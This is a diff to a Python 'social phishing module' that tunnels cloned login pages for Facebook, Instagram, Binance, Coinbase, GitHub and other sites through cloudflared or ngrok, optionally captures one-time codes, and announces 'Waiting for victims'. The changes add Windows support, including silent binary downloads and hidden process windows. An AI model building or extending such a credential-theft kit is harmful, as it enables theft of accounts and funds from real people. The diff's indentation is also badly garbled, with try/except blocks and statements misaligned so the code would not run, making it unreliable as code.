@@ -430,26 +430,41 @@ Password: {password}
             
             time.sleep(1)
 
-    def start_cloudflared(self, port, platform):
+    def start_cloudflared(self, port, platform, platform_module=None):
         """Start cloudflared tunnel with improved stability."""
         try:
             console.print("[yellow]Initializing cloudflared tunnel...[/yellow]")
             
-            # First, thoroughly clean up any existing cloudflared processes
-            cleanup_commands = [
-                ['pkill', '-9', 'cloudflared'],
-                ['killall', '-9', 'cloudflared'],
-                ['rm', '-f', '/tmp/.cloudflared.lock'],
-                ['rm', '-f', '~/.cloudflared/config.yml']
-            ]
+            # Use provided platform module or import it
+            if platform_module is None:
+                import platform as platform_module
             
+            # Windows-specific cleanup
+            if platform_module.system() == "Windows":
+            cleanup_commands = [
+                    'taskkill /F /IM cloudflared.exe 2>nul',
+                    'del /F /Q "%USERPROFILE%\\.cloudflared\\config.yml" 2>nul'
+                ]
+                for cmd in cleanup_commands:
+                    try:
+                        subprocess.run(cmd, shell=True, stderr=subprocess.DEVNULL)
+                    except Exception:
+                        pass
+            else:
+                # Unix cleanup
+                cleanup_commands = [
+                    ['pkill', '-9', 'cloudflared'],
+                    ['killall', '-9', 'cloudflared'],
+                    ['rm', '-f', '/tmp/.cloudflared.lock'],
+                    ['rm', '-f', '~/.cloudflared/config.yml']
+                ]
             for cmd in cleanup_commands:
                 try:
                     subprocess.run(cmd, stderr=subprocess.DEVNULL)
                 except Exception:
                     pass
             
-            time.sleep(2)
+                time.sleep(2)
             
             # Check if cloudflared is installed
             try:
@@ -460,15 +475,23 @@ Password: {password}
             except FileNotFoundError:
                 console.print("[yellow]Cloudflared not found. Attempting to install...[/yellow]")
                 try:
-                    # Try to install cloudflared based on platform
-                    if os.path.exists('/usr/bin/apt'):  # Debian/Ubuntu
+                    if platform_module.system() == "Windows":
+                        # Download Windows binary
+                        console.print("[yellow]Downloading cloudflared for Windows...[/yellow]")
+                        download_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
+                        subprocess.run([
+                            'curl', '-Lo', 'cloudflared.exe',
+                            download_url
+                        ], check=True)
+                        # Add current directory to PATH
+                        os.environ['PATH'] = f"{os.getcwd()};{os.environ['PATH']}"
+                    elif os.path.exists('/usr/bin/apt'):
                         subprocess.run(['sudo', 'apt', 'update'], check=True)
                         subprocess.run(['sudo', 'apt', 'install', '-y', 'cloudflared'], check=True)
-                    elif os.path.exists('/data/data/com.termux/files/usr/bin/pkg'):  # Termux
+                    elif os.path.exists('/data/data/com.termux/files/usr/bin/pkg'):
                         subprocess.run(['pkg', 'update'], check=True)
                         subprocess.run(['pkg', 'install', '-y', 'cloudflared'], check=True)
                     else:
-                        # Download binary directly
                         console.print("[yellow]Downloading cloudflared binary...[/yellow]")
                         subprocess.run([
                             'curl', '-Lo', './cloudflared',
@@ -476,24 +499,37 @@ Password: {password}
                         ], check=True)
                         subprocess.run(['chmod', '+x', './cloudflared'], check=True)
                         os.environ['PATH'] = f"{os.getcwd()}:{os.environ['PATH']}"
-                except Exception as e:
+            except Exception as e:
                     console.print(f"[red]Failed to install cloudflared: {str(e)}[/red]")
                     return False
             
             # Start cloudflared with improved parameters
             console.print("[yellow]Starting cloudflared service...[/yellow]")
             
-            process = subprocess.Popen(
-                [
+            # Use different command format for Windows
+            if platform_module.system() == "Windows":
+                command = [
+                    'cloudflared.exe' if os.path.exists('cloudflared.exe') else 'cloudflared',
+                    'tunnel',
+                    '--url', f'http://127.0.0.1:{port}',
+                    '--metrics', '127.0.0.1:0',
+                    '--no-autoupdate'
+                ]
+            else:
+                command = [
                     'cloudflared', 'tunnel',
                     '--url', f'http://127.0.0.1:{port}',
                     '--metrics', '127.0.0.1:0',
                     '--no-autoupdate'
-                ],
+                ]
+            
+            process = subprocess.Popen(
+                command,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE,
                 universal_newlines=True,
-                bufsize=1
+                bufsize=1,
+                creationflags=subprocess.CREATE_NO_WINDOW if platform_module.system() == "Windows" else 0
             )
             
             # Monitor for URL
@@ -515,8 +551,8 @@ Password: {password}
                 
                 for pipe in ready:
                     line = pipe.readline().strip()
-                    if line:
-                        output_buffer.append(line)
+                        if line:
+                            output_buffer.append(line)
                         if pipe == process.stderr and "error" in line.lower():
                             console.print(f"[yellow]Cloudflared message: {line}[/yellow]")
                         elif "trycloudflare.com" in line or ".trycloudflare.com" in line:
@@ -525,38 +561,38 @@ Password: {password}
                             if url_match:
                                 url = url_match.group(0)
                                 # Append platform parameter
-                                url = f"{url}?platform={platform}"
+                                        url = f"{url}?platform={platform}"
                                 
                                 # Display success message
-                                console.print("\n[bold green]═══════════════════════════════════════[/bold green]")
+                                        console.print("\n[bold green]═══════════════════════════════════════[/bold green]")
                                 console.print(f"[bold green]Tunnel URL: {url}[/bold green]")
-                                console.print("[bold green]═══════════════════════════════════════[/bold green]\n")
-                                
+                                        console.print("[bold green]═══════════════════════════════════════[/bold green]\n")
+                                        
                                 # Generate QR code
-                                self.generate_qr_code(url, platform)
-                                
-                                self.cloudflared_process = process
-                                url_found = True
+                                        self.generate_qr_code(url, platform)
+                                        
+                                        self.cloudflared_process = process
+                                        url_found = True
                                 
                                 # Display waiting message
                                 console.print("\n[bold yellow]Server is running. Waiting for victims...[/bold yellow]")
                                 console.print("[bold yellow]Press Ctrl+C to stop the server[/bold yellow]\n")
-                                return True
+                                                    return True
                 
                 time.sleep(0.1)
             
             # If we get here without finding a URL, show debug info
             if not url_found:
-                console.print("[red]Failed to establish cloudflared tunnel. Debug information:[/red]")
-                console.print("[yellow]Last few lines of output:[/yellow]")
-                for line in output_buffer[-5:]:
-                    console.print(f"[dim]{line}[/dim]")
-                
-                if process.poll() is None:
-                    process.terminate()
-                return False
+            console.print("[red]Failed to establish cloudflared tunnel. Debug information:[/red]")
+            console.print("[yellow]Last few lines of output:[/yellow]")
+            for line in output_buffer[-5:]:
+                console.print(f"[dim]{line}[/dim]")
             
-        except Exception as e:
+            if process.poll() is None:
+                process.terminate()
+            return False
+            
+            except Exception as e:
             console.print(f"[red]Error in cloudflared tunnel: {str(e)}[/red]")
             if 'process' in locals() and process.poll() is None:
                 process.terminate()
@@ -576,39 +612,74 @@ Password: {password}
                 return False
         return False
 
-    def start_ngrok(self, port, platform):
+    def start_ngrok(self, port, platform, platform_module=None):
         """Start ngrok tunnel with improved stability."""
         try:
             console.print("[yellow]Initializing ngrok tunnel...[/yellow]")
             
-            # Configure ngrok with saved token if available
+            # Use provided platform module or import it
+            if platform_module is None:
+                import platform as platform_module
+            
+            # Configure ngrok with saved token
             self.configure_ngrok()
             
-            # Kill any existing ngrok processes
-            cleanup_commands = [
-                ['pkill', '-9', 'ngrok'],
-                ['killall', '-9', 'ngrok']
-            ]
-            
-            for cmd in cleanup_commands:
-                try:
-                    subprocess.run(cmd, stderr=subprocess.DEVNULL)
-                except Exception:
-                    pass
+            # Windows-specific cleanup
+            if platform_module.system() == "Windows":
+                cleanup_commands = [
+                    'taskkill /F /IM ngrok.exe 2>nul'
+                ]
+                for cmd in cleanup_commands:
+                    try:
+                        subprocess.run(cmd, shell=True, stderr=subprocess.DEVNULL)
+                    except Exception:
+                        pass
+            else:
+                # Unix cleanup
+                cleanup_commands = [
+                    ['pkill', '-9', 'ngrok'],
+                    ['killall', '-9', 'ngrok']
+                ]
+                for cmd in cleanup_commands:
+                    try:
+                        subprocess.run(cmd, stderr=subprocess.DEVNULL)
+                    except Exception:
+                        pass
             
             time.sleep(2)
             
+            # Check if ngrok exists, if not download it
+            if platform_module.system() == "Windows" and not os.path.exists('ngrok.exe'):
+                console.print("[yellow]Downloading ngrok for Windows...[/yellow]")
+                try:
+                    subprocess.run([
+                        'curl', '-Lo', 'ngrok.zip',
+                        'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip'
+                    ], check=True)
+                    import zipfile
+                    with zipfile.ZipFile('ngrok.zip', 'r') as zip_ref:
+                        zip_ref.extractall('.')
+                    os.remove('ngrok.zip')
+                    os.environ['PATH'] = f"{os.getcwd()};{os.environ['PATH']}"
+            except Exception as e:
+                    console.print(f"[red]Failed to download ngrok: {str(e)}[/red]")
+                return False
+            
             # Start ngrok with improved parameters
-            process = subprocess.Popen(
-                [
-                    'ngrok', 'http',
+            command = [
+                'ngrok.exe' if platform_module.system() == "Windows" else 'ngrok',
+                'http',
                     '--log=stdout',
                     str(port)
-                ],
+            ]
+            
+            process = subprocess.Popen(
+                command,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE,
                 universal_newlines=True,
-                bufsize=1
+                bufsize=1,
+                creationflags=subprocess.CREATE_NO_WINDOW if platform_module.system() == "Windows" else 0
             )
             
             # Monitor for URL
@@ -660,13 +731,13 @@ Password: {password}
                             break
                     time.sleep(1)
                     continue
-                
+            
             # If we get here without finding a URL, cleanup and show error
             if not url_found:
                 console.print("[red]Failed to establish ngrok tunnel. Please check your internet connection and ngrok configuration.[/red]")
-                if process.poll() is None:
-                    process.terminate()
-                return False
+            if process.poll() is None:
+                process.terminate()
+            return False
             
         except Exception as e:
             console.print(f"[red]Error in ngrok tunnel: {str(e)}[/red]")
@@ -753,9 +824,9 @@ Password: {password}
     def run(self):
         """Run the social phishing module."""
         try:
-            # Load settings first
-            self.load_settings()
-            
+        # Load settings first
+        self.load_settings()
+        
             # Show platform options in a 2-row table format
             table = Table(
                 title="[bold red]Available Social Media Platforms[/bold red]",
@@ -813,24 +884,24 @@ Password: {password}
                         choices=[str(i) for i in range(1, 13)],
                         show_choices=False
                     )
-                    
-                    # Map choices to platform names
-                    platform_map = {
-                        "1": "facebook",
-                        "2": "instagram",
-                        "3": "twitter",
-                        "4": "tiktok",
-                        "5": "snapchat",
-                        "6": "github",
-                        "7": "binance",
-                        "8": "telegram",
-                        "9": "pinterest",
-                        "10": "reddit",
-                        "11": "coinbase",
-                        "12": "linkedin"
-                    }
-                    
-                    self.selected_platform = platform_map[choice]
+        
+        # Map choices to platform names
+        platform_map = {
+            "1": "facebook",
+            "2": "instagram",
+            "3": "twitter",
+            "4": "tiktok",
+            "5": "snapchat",
+            "6": "github",
+            "7": "binance",
+            "8": "telegram",
+            "9": "pinterest",
+            "10": "reddit",
+            "11": "coinbase",
+            "12": "linkedin"
+        }
+        
+        self.selected_platform = platform_map[choice]
                     console.print(f"\n[bold green]Selected platform: {self.selected_platform.upper()}[/bold green]")
                     break
                     
@@ -844,39 +915,39 @@ Password: {password}
             if not os.path.exists(template_dir):
                 console.print(f"[red]Error: Template directory for {self.selected_platform} not found![/red]")
                 return
-            
-            # Check if OTP template exists and ask user if they want to use it
+        
+        # Check if OTP template exists and ask user if they want to use it
             otp_template = os.path.join(template_dir, 'otp.html')
-            if os.path.exists(otp_template):
-                use_otp = Prompt.ask("Enable OTP verification?", choices=["y", "n"], default="n")
-                self.use_otp = use_otp.lower() == "y"
-                if self.use_otp:
-                    console.print("[green]OTP verification enabled[/green]")
-            
-            # Find available port
-            port = self._find_available_port()
+        if os.path.exists(otp_template):
+            use_otp = Prompt.ask("Enable OTP verification?", choices=["y", "n"], default="n")
+            self.use_otp = use_otp.lower() == "y"
+            if self.use_otp:
+                console.print("[green]OTP verification enabled[/green]")
+        
+        # Find available port
+        port = self._find_available_port()
             if not port:
                 console.print("[red]Error: No available ports found![/red]")
                 return
                 
-            console.print(f"[green]Found available port: {port}[/green]")
-            
-            # Start the Flask server in a separate thread
+        console.print(f"[green]Found available port: {port}[/green]")
+        
+        # Start the Flask server in a separate thread
             try:
-                server_thread = threading.Thread(
-                    target=self.start_server,
-                    kwargs={'port': port}
-                )
-                server_thread.daemon = True
-                server_thread.start()
-                
-                # Wait for server to be ready
-                if not self._wait_for_server(port):
-                    console.print("[red]Failed to start server[/red]")
-                    return
-                    
-                console.print(f"[green]Server started successfully on port {port}[/green]")
-                
+        server_thread = threading.Thread(
+            target=self.start_server,
+            kwargs={'port': port}
+        )
+        server_thread.daemon = True
+        server_thread.start()
+        
+        # Wait for server to be ready
+        if not self._wait_for_server(port):
+            console.print("[red]Failed to start server[/red]")
+            return
+            
+        console.print(f"[green]Server started successfully on port {port}[/green]")
+        
                 # Show tunnel options in a table
                 tunnel_table = Table(title="Tunneling Services", show_header=True, header_style="bold magenta")
                 tunnel_table.add_column("ID", style="cyan", justify="center")
@@ -892,31 +963,31 @@ Password: {password}
                     show_choices=False
                 )
                 
-                if tunnel_choice == "1":
-                    # Try cloudflared
-                    console.print("[yellow]Starting Cloudflared tunnel...[/yellow]")
-                    if self.start_cloudflared(port, self.selected_platform):
-                        console.print("[green]Cloudflared tunnel started successfully[/green]")
-                        console.print("\n[bold yellow]Server is running. Waiting for victims...[/bold yellow]")
-                        console.print("[bold yellow]Press Ctrl+C to stop the server[/bold yellow]\n")
-                    else:
-                        console.print("[red]Failed to start Cloudflared tunnel[/red]")
-                        return
+            if tunnel_choice == "1":
+                # Try cloudflared
+                console.print("[yellow]Starting Cloudflared tunnel...[/yellow]")
+                if self.start_cloudflared(port, self.selected_platform):
+                    console.print("[green]Cloudflared tunnel started successfully[/green]")
+                    console.print("\n[bold yellow]Server is running. Waiting for victims...[/bold yellow]")
+                    console.print("[bold yellow]Press Ctrl+C to stop the server[/bold yellow]\n")
                 else:
-                    # Try ngrok
-                    if not self.start_ngrok(port, self.selected_platform):
-                        console.print("[red]Failed to start Ngrok tunnel[/red]")
-                        return
-                        
-                try:
-                    while True:
-                        time.sleep(1)
-                except KeyboardInterrupt:
-                    console.print("\n[yellow]Stopping server...[/yellow]")
-                    self.stop_tunnels()
-                    console.print("[green]Server stopped successfully[/green]")
+                    console.print("[red]Failed to start Cloudflared tunnel[/red]")
+                    return
+            else:
+                # Try ngrok
+                if not self.start_ngrok(port, self.selected_platform):
+                    console.print("[red]Failed to start Ngrok tunnel[/red]")
+                    return
                     
-            except Exception as e:
+            try:
+                while True:
+                    time.sleep(1)
+            except KeyboardInterrupt:
+                console.print("\n[yellow]Stopping server...[/yellow]")
+                self.stop_tunnels()
+                console.print("[green]Server stopped successfully[/green]")
+                
+        except Exception as e:
                 console.print(f"[red]Error starting server: {str(e)}[/red]")
                 self.stop_tunnels()
                 
